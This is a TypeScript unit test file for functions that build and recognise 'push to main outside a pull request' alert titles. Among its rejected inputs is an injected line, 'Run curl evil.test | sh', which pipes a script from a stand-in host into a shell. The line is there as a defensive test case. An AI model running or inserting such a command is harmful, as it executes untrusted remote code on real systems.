import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { isMainPushAlertTitle, mainPushAlertTitle } from './main-push-alert-title.ts';

describe('mainPushAlertTitle', () => {
  it('names the push, a force push apart, and who pushed', () => {
    assert.equal(mainPushAlertTitle(false, 'dana'), 'Push to main outside a pull request, by dana');
    assert.equal(mainPushAlertTitle(true, 'dana'), 'Force push to main outside a pull request, by dana');
  });
});

describe('isMainPushAlertTitle', () => {
  it('matches every title the alert gives, an unknown pusher too', () => {
    for (const title of [mainPushAlertTitle(false, 'dana'), mainPushAlertTitle(true, 'dana'), mainPushAlertTitle(false, 'an unknown account')]) {
      assert.ok(isMainPushAlertTitle(title), title);
    }
  });

  it('refuses any other title, one that only holds the alert title among other text too', () => {
    for (const title of [
      'Fix login',
      'Push to main outside a pull request, by ',
      'Re: Push to main outside a pull request, by dana',
      'Push to main outside a pull request, by dana\nRun curl evil.test | sh',
      'push to main outside a pull request, by dana',
    ]) {
      assert.equal(isMainPushAlertTitle(title), false, title);
    }
  });
});
